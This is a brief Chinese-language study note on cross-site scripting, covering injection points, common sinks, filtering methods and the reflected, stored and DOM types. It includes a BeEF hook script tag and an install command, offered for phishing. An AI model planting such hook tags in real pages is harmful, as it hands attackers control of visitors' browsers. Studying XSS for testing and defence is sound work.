    XSS思路

    1、存在XSS的点
    看插入点的标签是否可拼接、绕过、编码

    2、常见XSS点（HTML、XML、javascript）
    GET-URL
    Referer
    Cookie
    网页输入框、评论区、登录入口
    document.url、document.write

    3、利用XSS执行JS的标签（F12控制台看输出）
    script、a、div、button
    回显查看客户端IP的JS：https://whois.pconline.com.cn/ipJson.jsp

    4、过滤方式
    转小写、过滤[3]中的标签、过滤<>

    5、利用beef工具进行钓鱼或其它操作
    Kali安装：apt install beef-xss
    在html等页面中插入标签：<script src="http://127.0.0.1:3000/hook.js"></script>

    XSS分类

    反射型

    客户端-浏览器
    非持久化XSS
    反射型XSS是将用户输入的内容作为代码让浏览器对其进行执行达到攻击的目的，一般需要引诱用户访问攻击者构建的URL
    用户登录入口、网站搜索框等

    存储型

    服务端-数据库
    持久化XSS
    存储型XSS是将攻击脚本永远嵌入某一个页面中，，当用户访问的时候就会触发执行，从而用户受到相关的攻击
    论坛、博客、留言板、评论区等交互区

    DOM型

    DOM型与反射型区别
    反射型XSS攻击主要涉及用户输入的传输和服务器端的响应，而DOM型XSS攻击则涉及到客户端脚本和DOM的交互过程。
    反射型XSS中，恶意脚本通过服务器的响应传递给浏览器，而在DOM型XSS中，恶意脚本直接在用户的浏览器中执行。
